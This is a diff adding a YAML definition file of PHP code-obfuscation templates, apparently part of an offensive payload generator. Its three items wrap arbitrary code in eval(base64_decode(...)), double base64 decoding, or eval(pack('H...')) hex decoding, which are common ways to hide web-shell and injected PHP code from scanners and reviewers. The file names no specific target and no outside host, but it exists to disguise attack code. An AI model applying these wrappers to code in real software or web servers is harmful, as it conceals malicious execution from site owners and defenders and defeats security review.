@@ -1,0 +1,59 @@
+---
+
+###
+### Meta definitions
+###
+specification:
+  payload: code
+  type: obfuscator
+  version: 0.0.1
+
+
+###
+### Items
+###
+items:
+
+  - name: php-eval-base64
+    desc: desc
+    info: []
+    code:
+      language: php
+      requires:
+        version: [5, 6, 7, 8]
+        commands: []
+        functions: ["eval", "base64_decode"]
+        modules: []
+        os: ["bsd", "linux", "mac", "windows"]
+    payload: |
+      eval(base64_decode("<FUN:0:base64pad>__CODE__</FUN:0:base64pad>"));
+
+
+  - name: php-eval-base64-base64
+    desc: desc
+    info: []
+    code:
+      language: php
+      requires:
+        version: [5, 6, 7, 8]
+        commands: []
+        functions: ["eval", "base64_decode"]
+        modules: []
+        os: ["bsd", "linux", "mac", "windows"]
+    payload: |
+      eval(base64_decode(base64_decode("<FUN:0:2xbase64pad>__CODE__</FUN:0:2xbase64pad>")));
+
+
+  - name: php-eval-pack-hex
+    desc: desc
+    info: []
+    code:
+      language: php
+      requires:
+        version: [5, 6, 7, 8]
+        commands: []
+        functions: ["eval", "pack"]
+        modules: []
+        os: ["bsd", "linux", "mac", "windows"]
+    payload: |
+      eval(pack("H<FUN:1:len><FUN:0:hexplain>__CODE__</FUN:0:hexplain></FUN:1:len>","<FUN:0:hexplain>__CODE__</FUN:0:hexplain>"));
